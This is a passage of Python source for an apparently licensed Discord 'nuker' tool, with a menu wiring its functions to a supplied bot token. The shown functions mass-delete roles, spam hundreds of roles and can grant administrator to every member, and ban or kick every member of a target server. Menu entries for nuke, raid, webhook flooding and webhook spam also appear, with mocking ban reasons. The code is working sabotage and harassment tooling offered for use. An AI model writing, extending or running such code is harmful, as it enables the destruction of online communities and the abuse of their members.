    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    g = bot.get_guild(gid)
    if not g: return

    await asyncio.gather(*(r.delete() for r in g.roles if r != g.default_role), return_exceptions=True)

async def role_spam(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} Role name > ") or "NULL"
    admin = input(f"{get_color('light')}[?]{Style.RESET_ALL} Admin? (y/n) > ").lower().startswith('y')

    g = bot.get_guild(gid)
    if not g: return

    perms = discord.Permissions(administrator=admin)
    first = await g.create_role(name=name, permissions=perms)

    await asyncio.gather(*(m.add_roles(first) for m in g.members if not m.bot), return_exceptions=True)

    await asyncio.gather(*(g.create_role(name=name) for _ in range(499)), return_exceptions=True)

async def ban_all(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    g = bot.get_guild(gid)
    if not g: return

    await asyncio.gather(*(m.ban(reason="null xd", delete_message_days=0) for m in g.members if m != g.me), return_exceptions=True)

async def kick_all(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    g = bot.get_guild(gid)
    if not g: return

    await asyncio.gather(*(m.kick(reason="null owns") for m in g.members if m != g.me), return_exceptions=True)

# ────────────────────────────────────────────────────────────────────────────────
#   MAIN LOOP
# ────────────────────────────────────────────────────────────────────────────────

def main():
    global current_theme
    
    valid_license, license_key = validate_license_key()
    
    if not valid_license:
        valid_license, license_key = validate_license_key(save_license_prompt=True)
    
    if not valid_license:
        sys.exit(1)
    
    while True:
        choice = display_main_menu()
        
        if choice == "1":
            color_choice = display_color_selection()
            if color_choice in COLOR_THEMES:
                current_theme = COLOR_THEMES[color_choice]
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color changed to {current_theme['name']}{Style.RESET_ALL}")
            else:
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid color choice{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()
            
        elif choice == "2":
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Generating new ID...{Style.RESET_ALL}")
            
            licenses = fetch_license_data()
            user_id = ""
            
            for license_entry in licenses:
                if license_entry.get("Licensekey") == license_key:
                    user_id = license_entry.get("id", "").strip()
                    break
            
            if not user_id:
                user_id = generate_random_id()
                update_license_data_with_ip(license_key, get_hwid(), user_id, None)
            
            save_id_to_file(user_id, license_key)
            print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}ID generated and saved!{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()
            
        elif choice == "3":
            while True:
                sub = display_nuking_menu()

                if sub in ("0", "", "back"):
                    break

                if sub == "4":
                    asyncio.run(webhook_spam(None))
                    input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
                    continue

                token = input(f"\n{Fore.RED}Bot Token > {Style.RESET_ALL}").strip()
                if not token: continue

                action_map = {
                    "1": fast_nuke,
                    "2": nuke,
                    "3": raid,
                    "5": webhook_flood,
                    "6": role_delete,
                    "7": role_spam,
                    "8": ban_all,
                    "9": kick_all,
                }

                if sub in action_map:
                    asyncio.run(run_nuker(token, action_map[sub]))
                else:
                    print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")

                input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")

        elif choice == "4" or choice.lower() == "exit":
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.WHITE}Exiting...{Style.RESET_ALL}")
            time.sleep(1)
            sys.exit(0)
            
        else:
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Invalid option{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Interrupted{Style.RESET_ALL}")
        sys.exit(0)
